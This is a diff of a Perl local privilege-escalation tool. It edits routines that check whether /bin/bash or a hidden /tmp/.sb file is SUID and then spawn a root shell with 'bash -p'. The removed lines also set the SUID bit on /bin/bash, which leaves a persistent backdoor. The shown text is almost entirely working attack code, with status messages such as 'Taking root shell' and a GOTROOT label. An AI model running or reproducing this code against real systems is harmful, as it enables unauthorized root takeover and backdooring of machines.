@@ -105,23 +105,13 @@ sub is_suid {
 
 sub try_suid_bash {
     if (is_suid("/bin/bash")) {
-        print "${G}[+] /bin/bash is SUID! Escalating...${Z}\n";
-        $> = 0; $( = 0; $) = 0;  # set euid/egid first
-        system("/bin/bash -p -c 'chmod +s /bin/bash 2>/dev/null; exec /bin/sh -p'");
-        # if we're back, try raw
-        if ($> == 0 || geteuid() == 0) {
-            exec "/bin/sh", "-p";
-        }
-        return 1;
+        print "${G}[+] /bin/bash is SUID! Taking root shell...${Z}\n";
+        exec "/bin/bash", "-p";
+        # unreachable - exec replaces process
     }
     if (is_suid("/tmp/.sb")) {
-        print "${G}[+] /tmp/.sb is SUID!${Z}\n";
-        $> = 0; $( = 0; $) = 0;
-        system("/tmp/.sb -p -c 'chmod +s /bin/bash 2>/dev/null; exec /bin/sh -p'");
-        if ($> == 0 || geteuid() == 0) {
-            exec "/bin/sh", "-p";
-        }
-        return 1;
+        print "${G}[+] /tmp/.sb is SUID! Taking root shell...${Z}\n";
+        exec "/tmp/.sb", "-p";
     }
     return 0;
 }
@@ -532,14 +522,9 @@ sub main {
     exit 1;
 
   GOTROOT:
-    print "${G}[+] DONE - Checking root...${Z}\n";
     try_suid_bash();
     if (isroot()) { droproot(); }
-    if (is_suid("/bin/bash")) {
-        print "${G}[+] Run: /bin/bash -p${Z}\n";
-        exec "/bin/bash", "-p";
-        system("/bin/bash -p");
-    }
+    print "${R}[-] Something went wrong. Try: /bin/bash -p${Z}\n";
 }
 
 main();
